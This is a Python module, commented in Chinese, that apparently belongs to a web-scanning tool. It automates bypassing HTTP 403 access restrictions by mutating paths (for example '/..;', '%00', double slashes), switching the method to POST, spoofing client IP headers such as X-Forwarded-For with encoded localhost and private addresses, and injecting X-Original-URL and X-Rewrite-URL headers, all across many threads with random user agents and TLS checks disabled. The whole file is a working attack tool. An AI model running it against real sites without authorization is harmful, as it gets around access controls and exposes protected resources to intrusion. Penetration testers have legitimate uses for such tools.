# -*- coding: utf-8 -*-
"""
403 Bypass模块
整合多种绕过403的技术：路径变形、HTTP方法切换、IP头伪造、URL重写头
"""

import random
import re
import requests
import threading
import urllib3

from lib.core.logger import logger
from lib.core.settings import USER_AGENT_POOL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# IP伪造值（含十六进制、八进制、十进制localhost）
SPOOF_IPS = [
    "localhost", "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
    "2130706433", "0x7F000001", "0177.0000.0000.0001",
    "0", "127.1",
    "10.0.0.0", "10.0.0.1", "172.16.0.0", "172.16.0.1",
    "192.168.1.0", "192.168.1.1",
]

# IP伪造头
IP_HEADERS = [
    "X-Custom-IP-Authorization", "X-Forwarded-For", "X-Forward-For",
    "X-Remote-IP", "X-Originating-IP", "X-Remote-Addr",
    "X-Client-IP", "X-Real-IP",
]

# URL重写头
REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL"]


def generate_path_variants(path):
    """生成路径变形列表"""
    path = path.strip("/")
    variants = []

    # 双斜杠 / 点技巧
    variants.append(f"/{path}//")
    variants.append(f"/{path}/./")
    variants.append(f"//{path}")
    variants.append(f"//{path}//")

    # URL编码前缀
    variants.append(f"/%2e/{path}")

    # 尾部后缀
    suffixes = [
        "/", "/*/", "/*", "/..;", "//..;", "%20", "%09", "%00",
        ".json", ".css", ".html", "?", "??", "???", "?testparam",
        "#", "#test", "/.",
    ]
    for s in suffixes:
        variants.append(f"/{path}{s}")

    return variants


def generate_ip_headers():
    """生成IP伪造头列表"""
    headers_list = []
    for header in IP_HEADERS:
        for ip in SPOOF_IPS:
            headers_list.append({header: ip})
    return headers_list


def generate_rewrite_headers(path):
    """生成URL重写头"""
    return [
        {"X-Original-URL": f"/{path.strip('/')}"},
        {"X-Rewrite-URL": f"/{path.strip('/')}"},
    ]


class Pass403Result:
    """Bypass结果"""
    def __init__(self, path, technique, url, status, length, title=""):
        self.path = path
        self.technique = technique
        self.url = url
        self.status = status
        self.length = length
        self.title = title


class Pass403:
    """403 Bypass引擎"""

    def __init__(self, base_url, timeout=10, max_rate=0):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.max_rate = max_rate
        self.results = []
        self._lock = threading.Lock()
        self._tested = set()

    def _request(self, url, method="GET", headers=None):
        """发送请求"""
        try:
            random_ua = random.choice(USER_AGENT_POOL)
            req_headers = {"User-Agent": random_ua}
            if headers:
                req_headers.update(headers)

            if method == "POST":
                resp = requests.post(url, headers=req_headers, timeout=self.timeout,
                                     verify=False, allow_redirects=False)
            else:
                resp = requests.get(url, headers=req_headers, timeout=self.timeout,
                                    verify=False, allow_redirects=False)

            title = ""
            if "text/html" in resp.headers.get("content-type", ""):
                match = re.search(r"<title[^>]*>(.*?)</title>", resp.text[:4096], re.IGNORECASE)
                if match:
                    title = match.group(1).strip()[:60]

            return resp.status_code, len(resp.content), title
        except Exception:
            return 0, 0, ""

    def _try_bypass(self, path, technique, url, method="GET", headers=None):
        """尝试单个绕过"""
        key = f"{method}:{url}:{str(headers)}"
        with self._lock:
            if key in self._tested:
                return
            self._tested.add(key)

        status, length, title = self._request(url, method=method, headers=headers)
        if status and status != 403:
            result = Pass403Result(path, technique, url, status, length, title)
            with self._lock:
                self.results.append(result)

    def bypass_path(self, path):
        """路径变形绕过"""
        clean = path.strip("/")
        variants = generate_path_variants(clean)
        for variant in variants:
            url = f"{self.base_url}{variant}"
            self._try_bypass(path, "path", url)

    def bypass_method(self, path):
        """HTTP方法绕过 (POST)"""
        url = f"{self.base_url}/{path.strip('/')}"
        self._try_bypass(path, "POST", url, method="POST")

    def bypass_headers(self, path):
        """IP头伪造绕过"""
        url = f"{self.base_url}/{path.strip('/')}"
        for headers in generate_ip_headers():
            self._try_bypass(path, "IP-header", url, headers=headers)

    def bypass_rewrite(self, path):
        """URL重写头绕过"""
        for headers in generate_rewrite_headers(path):
            self._try_bypass(path, "rewrite", self.base_url, headers=headers)

    def run(self, paths, callback=None):
        """运行全部绕过"""
        for path in paths:
            self.bypass_path(path)
            self.bypass_method(path)
            self.bypass_headers(path)
            self.bypass_rewrite(path)
            if callback:
                callback(path, len(self.results))
        return self.results


class Pass403Threaded(Pass403):
    """多线程403 Bypass引擎"""

    def __init__(self, base_url, timeout=10, max_rate=0, threads=40):
        super().__init__(base_url, timeout, max_rate)
        self.threads = threads

    def run(self, paths, callback=None):
        """多线程运行绕过"""
        task_queue = list(paths)
        total = len(task_queue)

        def worker():
            while True:
                with self._lock:
                    if not task_queue:
                        return
                    path = task_queue.pop(0)

                self.bypass_path(path)
                self.bypass_method(path)
                self.bypass_headers(path)
                self.bypass_rewrite(path)

                if callback:
                    callback(path, len(self.results))

        threads = []
        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        return self.results
